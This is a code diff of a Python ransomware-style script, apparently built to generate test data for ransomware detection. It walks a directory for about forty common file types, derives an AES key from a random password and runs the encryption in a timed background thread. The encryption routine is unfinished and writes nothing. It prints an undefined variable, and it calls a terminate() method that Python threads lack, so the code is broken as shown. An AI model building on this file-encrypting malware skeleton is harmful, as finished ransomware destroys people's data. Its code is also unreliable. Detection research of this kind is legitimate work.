@@ -10,18 +10,20 @@ from os import walk
 
 encryption_timeout = 10
 encrypted_symbol = "enc_"
+ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
+base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
 
 def EncryptFile(fileToEncrypt, key):
-    print(fileToEncrypt)
-    #print(key)
-    pass
+    iv = Random.new().read(16)
+    aes_obj = AES.new(key, AES.MODE_CBC, iv)
+    print(iv)
+    print(file_to_encrypt)
 
 def EncryptAllFiles(filesToEncrypt, key):
     for file_to_encrypt in filesToEncrypt:
         EncryptFile(file_to_encrypt, key)
 
 def GetAllFiles(dirName):
-    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
     listOfFile = os.listdir(dirName)
     allFiles = list()
     for entry in listOfFile:
@@ -33,8 +35,7 @@ def GetAllFiles(dirName):
                 allFiles.append(fullPath)
     return allFiles
 
-def FuckTheSystem():
-    base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
+def StartEncryption():
     files_to_encrypt = GetAllFiles(base_path)
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     key = SHA256.new(password.encode('utf-8')).digest()
@@ -42,13 +43,12 @@ def FuckTheSystem():
 
 ###################### main ######################
 
-t1 = threading.Thread(target=FuckTheSystem)  # daemon thread runs the encrypt_all_files() function in background
-t1.daemon = True  # make the thread run in bg
-t1.start()  # start the encrypting thread
-t1.join(encryption_timeout)
+enc_thread = threading.Thread(target=StartEncryption)
+enc_thread.daemon = True
+enc_thread.start()
+enc_thread.join(encryption_timeout)
 
-# If thread is still active
-if t1.is_alive():
+if enc_thread.is_alive():
     print("terminated")
-    t1.terminate()
-    t1.join()
+    enc_thread.terminate()
+    enc_thread.join()
